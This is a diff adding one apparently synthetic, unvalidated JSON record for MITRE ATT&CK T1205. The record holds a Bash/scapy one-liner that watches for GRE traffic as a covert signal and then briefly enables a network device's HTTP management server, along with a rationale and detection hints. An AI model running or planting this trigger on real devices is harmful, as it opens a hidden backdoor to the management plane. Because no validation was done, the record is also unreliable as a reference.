@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'from scapy.all import sniff; import os; sniff(filter=\"ip proto 47\", count=1); os.system(\"ciscoconf --apply \\\"ip http server\\\" && (sleep 120; ciscoconf --apply \\\"no ip http server\\\") &\")'",
+  "explanation": "Treats the appearance of GRE (IP proto 47) traffic as a trigger to enable the device HTTP server for 2 minutes via ciscoconf. Requires sudo for packet capture.",
+  "rationale_steps": [
+    "Sniff for GRE as a covert signal indicating the operator\u2019s presence.",
+    "Enable the web management plane temporarily, then disable it after 120 seconds.",
+    "Keeps behavior simple and overtly tied to signaling traffic (T1205).",
+    "Detection: alert on unexpected GRE ingress and time-correlated enable/disable events of HTTP server."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-461879c1",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
